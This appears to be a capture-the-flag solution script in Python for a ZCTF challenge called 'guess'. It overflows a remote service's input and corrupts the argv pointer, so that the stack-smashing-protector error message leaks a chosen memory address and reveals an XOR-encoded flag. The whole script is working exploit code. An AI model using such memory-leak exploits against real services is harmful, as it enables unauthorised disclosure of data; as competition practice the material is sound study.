#!/usr/bin/env python
# coding:utf-8

from ctf import *

context.log_level = 'info'

# io = process('./guess_0456f1c26fcfba02478111b2ab20fe2e')

def leak(l, addr):
    io = remote('115.28.27.103', 22222)
    payload = 'ZCTF{'
    payload = ljust(payload, 34, '\x01')
    payload += '\x00'
    payload = ljust(payload, l)
    payload += p64(addr)
    io.sendline(payload)
    io.recvline_contains('you are wrong')
    if io.recv(10).find('stack') != -1:
        return io.recvregex(': (.*) terminated', group=1)
    io.close()

# l = 64
# r = 1000
# while l <= r:
#     m = (l + r) >> 1
#     print m
#     if leak(m, 0xdeadbeaf) is None:
#         r = m - 1
#     else:
#         l = m + 1
# print l, r # 290 289

# for i in xrange(280, 300):
#     print i, leak(i, 0x00000000006010C0 + 5)

log.success('ZCTF{%s', xor(leak(296, 0x00000000006010C0 + 5), '\x01'))
